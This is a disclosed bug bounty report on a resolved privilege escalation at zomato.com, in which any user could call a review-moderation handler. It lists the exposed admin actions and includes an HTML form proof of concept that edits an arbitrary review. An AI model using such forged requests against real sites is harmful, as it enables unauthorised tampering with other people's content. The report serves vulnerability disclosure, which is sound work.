---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '300099'
original_report_id: '300099'
title: '[www.zomato.com] Privilege Escalation - Control reviews - /████dashboard_handler.php'
weakness: Privilege Escalation
team_handle: zomato
created_at: '2017-12-22T18:51:47.061Z'
disclosed_at: '2018-03-29T16:58:58.029Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 18
asset_identifier: '*.zomato.com'
asset_type: WILDCARD
max_severity: critical
tags:
- hackerone
- privilege-escalation
---

# [www.zomato.com] Privilege Escalation - Control reviews - /████dashboard_handler.php

## Metadata

- HackerOne Report ID: 300099
- Weakness: Privilege Escalation
- Program: zomato
- Disclosed At: 2018-03-29T16:58:58.029Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

#Introduction 
The handler that controls all the ███ actions for reviews is accessible for any user. The following actions are thus being left open to anyone: 

```
get_manager_status
read███████
unread██████████
████████
feature██████
unfeature████████
moderate████
unmoderate█████
drop
███
send_mail
█████████
revoke
mark-spam
spam-revoke
remove-██████
add-█████████
reject_reported█████████
███████
```
Taken from the following [██████████]████████

#POC
This POC will use the action `██████` since it easily allows us to edit any review on Zomato.com. More severe options could be ██████ to read user info.

```html
<form action="https://www.zomato.com/██████████dashboard_handler.php" method="POST">
      <input type="hidden" name="action" value="█████" />
      <input type="hidden" name="review_id" value="31268525" />
      <input type="hidden" name="review" value="Privilege+Escalation" />
      <input type="submit" value="Submit request" />
</form>
```

Go to https://www.zomato.com/review/QvneAY and see the review has changed.

## Impact

Any user is able to control all the ████ actions for the reviews section including emailing, deleting, editing and adding to ██████████.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
